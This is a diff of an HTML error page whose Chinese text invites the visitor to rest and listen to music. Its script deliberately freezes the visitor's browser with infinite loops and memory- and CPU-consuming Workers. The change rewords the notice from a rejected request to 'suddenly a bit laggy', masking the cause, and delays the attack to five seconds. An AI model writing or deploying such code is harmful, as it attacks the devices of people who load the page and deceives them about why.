@@ -38,7 +38,7 @@
 
     <div class="container">
         <h1>Oops...</h1>
-        <h3>你的请求不被服务器接受</h3>
+        <h3>突然有点卡顿</h3>
         <h3>不过，为什么不休息一下听会音乐呢？</h3>
     </div>
     <script>
@@ -59,7 +59,7 @@
 
         async function run() {
             console.log("开始等待...");
-            await sleep(1000); // 等待1秒
+            await sleep(5000); // 等待5秒
             for (let i = 114.514191981; i > 0; i++) {
                 while (true) {
                     console.log(i += 114.514191981)
@@ -82,7 +82,7 @@
         }
         async function sun() {
             console.log("开始等待...");
-            await sleep(2000); // 等待2秒
+            await sleep(5000); // 等待5秒
             console.log("开始占用内存和CPU...");
 
             // 创建内存占用的Worker
